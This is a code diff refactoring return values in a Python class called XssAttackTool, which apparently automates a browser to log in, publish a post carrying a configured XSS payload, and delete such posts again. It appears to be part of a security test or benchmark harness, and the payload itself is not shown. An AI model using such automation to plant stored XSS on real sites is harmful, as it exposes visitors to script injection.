@@ -54,25 +54,23 @@ class XssAttackTool:
 
         return True
 
-    def _enable_attack(self) -> bool:
+    def _enable_attack(self) -> None:
         self.page.wait_for_selector(".loading-container", state="hidden")
 
         content = self.page.content()
         if self.config.xss_payload_identifier in content:
-            return False
+            return
 
         self.page.fill("textarea#content", self.config.attack_payload)
         self.page.click("button:has-text('Publish Post')")
         self.page.wait_for_selector(f"text={self.config.xss_payload_identifier}")
 
-        return True
-
-    def _disable_attack(self) -> bool:
+    def _disable_attack(self):
         self.page.wait_for_selector(".loading-container", state="hidden")
 
         content = self.page.content()
         if self.config.xss_payload_identifier not in content:
-            return False
+            return
 
         posts = self.page.query_selector_all(".thread-card")
         for post in posts:
@@ -83,21 +81,16 @@ class XssAttackTool:
                     delete_btn.click()
                     self.page.wait_for_timeout(1000)
 
-        return True
-
     def execute(self, operation: Literal["enable", "disable"]) -> bool:
         if not self._login():
             return False
 
         if operation == "enable":
-            result = self._enable_attack()
+            self._enable_attack()
         else:
-            result = self._disable_attack()
+            self._disable_attack()
 
-        if not self._logout():
-            return False
-
-        return result
+        return self._logout()
 
 
 if __name__ == '__main__':
